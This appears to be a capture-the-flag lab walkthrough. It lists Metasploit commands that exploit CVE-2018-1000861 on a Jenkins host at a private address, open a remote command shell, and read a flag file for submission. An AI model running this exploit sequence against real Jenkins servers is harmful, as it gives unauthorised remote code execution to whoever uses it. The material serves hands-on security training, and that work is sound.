The full metasploit walk, every line:

    msfconsole

    msf6 > search CVE-2018-1000861
    msf6 > use 0
    msf6 exploit(...) > set RHOSTS 10.4.12.1
    msf6 exploit(...) > set LHOST 10.4.12.99
    msf6 exploit(...) > check
    msf6 exploit(...) > exploit

Once `exploit` fires, you'll see "Command shell session 1 opened"
and the prompt goes blank. You're on the Jenkins box now. Run:

    cat /var/m0use/blueprint.txt

The flag is on the line that starts with "Flag:". Copy the value
inside m0use{...} — that's what you'll submit.

To leave the shell session:    exit
To leave msfconsole:            exit

Then type the flag value at the m0usenet prompt (no `m0use{` or
`}` wrapping, no keyword). Example: jenkins_was_a_mistake
